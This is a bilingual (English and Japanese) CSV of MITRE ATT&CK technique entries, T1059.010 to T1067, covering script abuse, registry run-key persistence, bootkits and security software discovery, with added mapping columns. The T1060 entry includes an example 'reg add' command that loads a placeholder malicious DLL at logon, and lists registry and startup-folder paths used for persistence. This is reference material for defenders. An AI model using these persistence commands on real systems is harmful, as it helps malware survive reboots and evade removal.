Technique_ID,Parent_Technique_ID,Technique_Name,技術名,Description(E),説明(E),Tactics,Platforms,Action_Type,Progression_Role,Environment_Requirements,Req_Status,Target_Asset_Candidates,Knowledge_Attributes,Ito_Steps,Primary_Step,Ito_Category_IDs,Ito_Category_Names,Primary_Ito_Category_ID,Primary_Ito_Category_Name,Ito_Tactic_IDs,STIX_Object_ID,Created,Modified,Applies_To_Asset_Class,Required_Platform_Tags,Required_Capabilities,Required_Keyword_Tags
T1059.010,T1059,AutoHotKey & AutoIT,AutoHotKey および AutoIT,"Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey) Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate) These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)",攻撃者はAutoITおよびAutoHotKey自動化スクリプトを使用してコマンドを実行し、悪意のあるタスクを実行する可能性があります。AutoITとAutoHotkey（AHK）は、ユーザーがWindowsタスクを自動化できるスクリプト言語です。これらの自動化スクリプトは、ボタンのクリック、テキスト入力、プログラムの起動・終了など、多様な操作を実行するために利用されます。(引用: AutoIT)(引用: AutoHotKey) 攻撃者はAHK（`.ahk`）およびAutoIT（`.au3`）スクリプトを悪用し、被害者システム上で悪意のあるコードを実行する可能性があります。例えば、攻撃者はAHKを用いてペイロードやキーロガーなどのモジュール型マルウェアを実行した事例があります。 攻撃者はまた、埋め込まれたマルウェアを含むカスタムAHKファイルを[フィッシング](https://attack.mitre.org/techniques/T1566)ペイロードとして使用しています。(引用: Splunk DarkGate) これらのスクリプトは、自己完結型の実行可能ペイロード（`.exe`）にコンパイルされることもあります。(引用: AutoIT)(引用: AutoHotKey),execution,Windows,script_command_execution,foothold,user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--3a32740a-11b0-4bcf-b0a9-3abd0f6d3cd5,2024-03-29T18:07:04.743Z,2025-04-15T19:58:23.600Z,,,,
T1059.011,T1059,Lua,Lua,"Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (<code>.lua</code>), or from Lua-embedded programs (through the <code>struct lua_State</code>).(Citation: Lua main page)(Citation: Lua state) Lua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.(Citation: PoetRat Lua)(Citation: Lua Proofpoint Sunseed)(Citation: Cyphort EvilBunny)(Citation: Kaspersky Lua)",攻撃者はLuaコマンドやスクリプトを悪用して実行を行う可能性があります。Luaは主にアプリケーションへの組み込み利用を目的としたクロスプラットフォームのスクリプト言語/プログラミング言語です。Luaはコマンドライン（スタンドアロンのluaインタプリタ経由）、スクリプト（<code>.lua</code>）、またはLua組み込みプログラム（<code>struct lua_State</code>経由）から実行可能です。（引用元： Luaメインページ)(引用: Lua状態) 悪意のある目的でLuaスクリプトが実行される可能性があります。攻撃者は既存のLuaインタプリタを組み込み、悪用、または置き換えることで、実行時に悪意のあるLuaコマンドの実行を可能にします。(引用: PoetRat Lua)(引用: Lua Proofpoint Sunseed)(引用: Cyphort EvilBunny)(引用: Kaspersky Lua),execution,Linux;macOS;Windows;Network Devices,script_command_execution,foothold,endpoint_execution,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--afddee82-3385-4682-ad90-eeced33f2d07,2024-08-05T18:19:42.201Z,2025-04-15T19:58:57.854Z,,,,
T1059.012,T1059,Hypervisor CLI,ハイパーバイザーCLI,"Adversaries may abuse hypervisor command line interpreters (CLIs) to execute malicious commands. Hypervisor CLIs typically enable a wide variety of functionality for managing both the hypervisor itself and the guest virtual machines it hosts. For example, on ESXi systems, tools such as `esxcli` and `vim-cmd` allow administrators to configure firewall rules and log forwarding on the hypervisor, list virtual machines, start and stop virtual machines, and more.(Citation: Broadcom ESXCLI Reference)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: LOLESXi) Adversaries may be able to leverage these tools in order to support further actions, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).",攻撃者はハイパーバイザーのコマンドラインインタプリタ（CLI）を悪用し、悪意のあるコマンドを実行する可能性があります。ハイパーバイザーCLIは通常、ハイパーバイザー自体とホストするゲスト仮想マシンの両方を管理するための多様な機能を提供します。 例えばESXiシステムでは、`esxcli`や`vim-cmd`などのツールにより、管理者はハイパーバイザー上のファイアウォールルールやログ転送の設定、仮想マシンの一覧表示、起動・停止などを実行できる。(引用: Broadcom ESXCLI Reference)(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(引用元: LOLESXi) 攻撃者はこれらのツールを悪用し、[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083) や [影響を与えるためのデータ暗号化](https://attack.mitre.org/techniques/T1486) といったさらなる行動を支援できる可能性があります。,execution,ESXi,script_command_execution,foothold,privileged_account;endpoint_execution;file_storage_access;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--d2d642da-61ff-4211-b4df-7923c9ca220c,2025-03-26T20:01:13.412Z,2025-04-15T21:24:59.280Z,,,,
T1060,,Registry Run Keys / Startup Folder,レジストリ実行キー / スタートアップフォルダ,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level. Placing a program within a startup folder will cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is: * <code>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> The startup folder path for all users is: * <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> The following run keys are created by default on Windows systems: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018) The following Registry keys can be used to set startup folder items for persistence: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> The following Registry keys can control automatic startup of services during boot: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code> Using policy settings to specify startup programs creates corresponding values in either of two Registry keys: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs. Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on. By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot. Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","攻撃者は、プログラムをスタートアップフォルダに追加するか、レジストリの実行キーで参照することで永続化を達成する可能性があります。レジストリの「実行キー」またはスタートアップフォルダにエントリを追加すると、ユーザーがログインした際に参照されたプログラムが実行されます。 (引用元: Microsoft Run Key) これらのプログラムはユーザーのコンテキストで実行され、アカウントに関連付けられた権限レベルを持ちます。プログラムをスタートアップフォルダ内に配置すると、ユーザーがログインした際にそのプログラムが実行されます。個々のユーザーアカウント用のスタートアップフォルダと、どのユーザーアカウントがログインしてもチェックされるシステム全体のスタートアップフォルダが存在します。 現在のユーザーのスタートアップフォルダパス: * <code>C:\Users\[ユーザー名]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> 全ユーザーのスタートアップフォルダパス: * <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> Windowsシステムではデフォルトで以下の実行キーが作成されます: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> も利用可能ですが、Windows Vista 以降ではデフォルトでは作成されません。レジストリの実行キーエントリは、プログラムを直接参照するか、依存関係としてリストできます。 (引用元: Microsoft RunOnceEx 2018年4月) 例えば、RunOnceEx の「Depend」キーを使用してログオン時に DLL をロードすることが可能です: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (引用元: Oddvar Moe RunOnceEx Mar 2018) 以下のレジストリキーを使用して、永続化のためのスタートアップフォルダ項目を設定できます: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> 以下のレジストリキーは、起動時のサービスの自動起動を制御できます: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>ポリシー設定を使用して起動プログラムを指定すると、次のいずれかのレジストリキーに対応する値が作成されます: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> Winlogonキーは、Windows 7を実行するコンピューターにユーザーがログオンした際に発生する操作を制御します。 これらの動作のほとんどはオペレーティングシステムによって制御されますが、ここにカスタムアクションを追加することも可能です。<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> および <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> サブキーはプログラムを自動的に起動できます。 レジストリキー <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> のロード値にリストされているプログラムは、ユーザーがログオンすると実行されます。 デフォルトでは、レジストリキー <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> のマルチストリング値 BootExecute は autocheck autochk * に設定されています。この値により、システムが異常終了した場合、Windows は起動時にハードディスクのファイルシステム整合性をチェックします。 攻撃者は、このレジストリ値に他のプログラムやプロセスを追加し、起動時に自動的に実行させることができます。攻撃者はこれらの設定場所を利用して、リモートアクセスツールなどのマルウェアを実行し、システムの再起動後も永続性を維持できます。攻撃者はまた、[偽装](https://attack.mitre.org/techniques/T1036)を使用して、レジストリエントリが正当なプログラムに関連付けられているように見せかけることもあります。",persistence,Windows,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc,2017-05-31T21:30:49.988Z,2025-04-25T15:15:53.310Z,,,,
T1061,,Graphical User Interface,グラフィカルユーザーインターフェース,"**This technique has been deprecated. Please use [Remote Services](https://attack.mitre.org/techniques/T1021) where appropriate.** The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.",**この手法は非推奨です。適切な場合には[リモートサービス](https://attack.mitre.org/techniques/T1021)を使用してください。**グラフィカルユーザーインターフェイス（GUI）は、オペレーティングシステムと対話する一般的な方法です。 攻撃者は、操作中にシステムのGUIを利用することがあり、一般的に[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1076)などのリモート対話セッションを通じて行われ、 [コマンドとスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059) ではなく、マウスのダブルクリックイベント、Windows の「ファイル名を指定して実行」コマンド（出典: Wikipedia Run Command）、または監視が困難なその他の操作を介して情報を検索し、ファイルを実行する可能性があります。,execution,Linux;macOS;Windows,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--a6525aec-acc4-47fe-92f9-b9b4de4b9228,2017-05-31T21:30:50.342Z,2025-04-25T15:15:57.623Z,,,,
T1062,,Hypervisor,ハイパーバイザー,**This technique has been deprecated and should no longer be used.** A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.,**この手法は非推奨となり、使用すべきではありません。** タイプ1ハイパーバイザーは、ゲストOSとシステムハードウェアの間に位置するソフトウェア層です（出典: Wikipedia ハイパーバイザー）。OSに対して仮想実行環境を提供します。一般的なハイパーバイザーの例としてXenがあります。 (出典: Wikipedia Xen) タイプ1ハイパーバイザーはオペレーティングシステムの下位レベルで動作し、ゲストOSからその存在を隠蔽する[ルートキット](https://attack.mitre.org/techniques/T1014)機能を備えた設計が可能です。(出典: Myers 2007) この種の悪意あるハイパーバイザーは、中断処理を通じてシステム上に永続化するために利用される可能性があります。,persistence,Windows,other,foothold,privileged_account,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--4be89c7c-ace6-4876-9377-c8d54cef3d63,2017-05-31T21:30:50.958Z,2025-04-25T15:15:30.122Z,,,,
T1063,,Security Software Discovery,セキュリティソフトウェアの検出,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. ### Windows Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. ### Mac It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.",攻撃者は、システムにインストールされているセキュリティソフトウェア、設定、防御ツール、センサーの一覧を取得しようとする可能性があります。これにはローカルファイアウォールルールやアンチウイルスなどが含まれます。 攻撃者は自動検出時の[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1063)から得た情報を基に、ターゲットへの完全な感染の可否や特定アクションの試行を含む、後続行動を決定する可能性がある。 ### Windows セキュリティソフトウェア情報を取得するために使用できるコマンド例としては、[netsh](https://attack.mitre.org/software/S0108)、[Reg](https://attack.mitre.org/software/S0075) を使用した <code>reg query</code>、 <code>dir</code>（[cmd](https://attack.mitre.org/software/S0106) 経由）、[Tasklist](https://attack.mitre.org/software/S0057) などがありますが、探査行動の他の指標は、攻撃者が探しているソフトウェアやセキュリティシステムの種類により特化したものとなる場合があります。 ### Mac macOS マルウェアが LittleSnitch や KnockKnock ソフトウェアのチェックを行うケースが増えています。,discovery,macOS;Windows,script_command_execution,situational_awareness,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7,2017-05-31T21:30:51.330Z,2025-04-25T15:15:16.682Z,,,,
T1064,,Scripting,スクリプティング,"**This technique has been deprecated. Please use [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) where appropriate.** Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts. Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them. Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)",**この手法は非推奨です。適切な場合には[コマンドとスクリプティングインタプリタ](https://attack.mitre.org/techniques/T1059)をご利用ください。**攻撃者は、手動で行う必要のある複数の操作を支援するためにスクリプトを使用することがあります。スクリプティングは、運用タスクの高速化や重要リソースへのアクセス獲得に必要な時間の短縮に有用です。 一部のスクリプト言語は、他のプログラムを呼び出す代わりにAPIレベルでOSと直接やり取りすることで、プロセス監視メカニズムを迂回するために使用される可能性があります。Windows向けの一般的なスクリプト言語にはVBScriptや[PowerShell](https://attack.mitre.org/techniques/T1086)がありますが、コマンドラインバッチスクリプトの形式をとる場合もあります。 スクリプトはOffice文書内にマクロとして埋め込み可能であり、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1193)やその他のスピアフィッシング攻撃で使用されるファイルが開かれた際に実行されるように設定できる。 悪意のある埋め込みマクロは、[クライアント実行のためのエクスプロイト](https://attack.mitre.org/techniques/T1203)によるソフトウェア悪用とは異なる実行手段であり、攻撃者はマクロが許可されていること、またはユーザーがマクロの実行を承諾することを前提とします。セキュリティテスターと攻撃者の双方に利用されるスクリプティング手法を採用した攻撃フレームワークは数多く存在します。 Metasploit（引用元: Metasploit_Ref）、Veil（引用元: Veil_Ref）、PowerSploit（引用元: Powersploit）は、侵入テスト担当者間でエクスプロイトおよび侵害後の操作に広く利用される3つの例であり、防御回避のための多くの機能を備えています。一部の攻撃者がPowerShellを使用していることも知られています（引用元: Alperovitch 2014）。,defense-evasion;execution,Linux;macOS;Windows,script_command_execution,stealth,user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44,2017-05-31T21:30:51.733Z,2025-04-25T15:15:48.264Z,,,,
T1065,,Uncommonly Used Port,非標準ポートの使用,Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.,攻撃者は、不適切に設定されたプロキシやファイアウォールを迂回するため、非標準ポートを介したC2通信を行う可能性がある。,command-and-control,Linux;macOS;Windows,c2_communication,remote_control,,unknown,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0,2017-05-31T21:30:53.408Z,2025-04-25T15:16:08.535Z,,,,
T1066,,Indicator Removal from Tools,ツールからの指標除去,"If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems. A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",悪意のあるツールが検知され隔離または制限された場合、攻撃者は検知原因（インジケーター）を特定し、ツールからインジケーターを除去して改変し、更新版を再利用することが可能となる。これにより標的の防御システムや同様のシステムを採用する次期標的から検知されなくなる。 その好例が、ファイル署名によってマルウェアが検出され、アンチウイルスソフトウェアによって隔離された場合である。マルウェアがファイル署名のために隔離されたと判断できる攻撃者は、[ソフトウェアのパッキング](https://attack.mitre.org/techniques/T1045) などを使用してファイルを変更し、別の署名を持たせた上で、そのマルウェアを再利用することができる。,defense-evasion,Linux;macOS;Windows,other,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6,2017-05-31T21:30:54.176Z,2025-04-25T15:15:04.223Z,,,,
T1067,,Bootkit,ブートキット,"A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016) Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly. ### Master Boot Record The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011) ### Volume Boot Record The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",ブートキットは、ハードドライブのブートセクタ（マスターブートレコード（MBR）やボリュームブートレコード（VBR）を含む）を改変するマルウェアの一種である。（出典：MTrends 2016）攻撃者はブートキットを用いて、オペレーティングシステムの下位レイヤでシステムへの永続化を図る場合があり、組織が使用を疑い適切な対応を取らない限り、完全な修復が困難となる可能性がある。 ### マスターブートレコード MBRは、BIOSによるハードウェア初期化完了後に最初に読み込まれるディスク領域である。ブートローダーが配置される場所である。ブートドライブへの直接アクセス権を持つ攻撃者は、この領域を上書きし、起動時の実行を通常のブートローダーから攻撃者コードへ転送させることが可能である。 (引用: Lau 2011)### ボリュームブートレコード MBRは起動プロセスの制御をVBRに引き渡します。MBRの場合と同様に、ブートドライブへの直接アクセス権を持つ攻撃者はVBRを上書きし、起動時の実行を攻撃者コードへ転送することが可能です。,persistence,Linux;Windows,other,foothold,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d,2017-05-31T21:30:54.661Z,2025-04-25T15:15:04.909Z,,,,
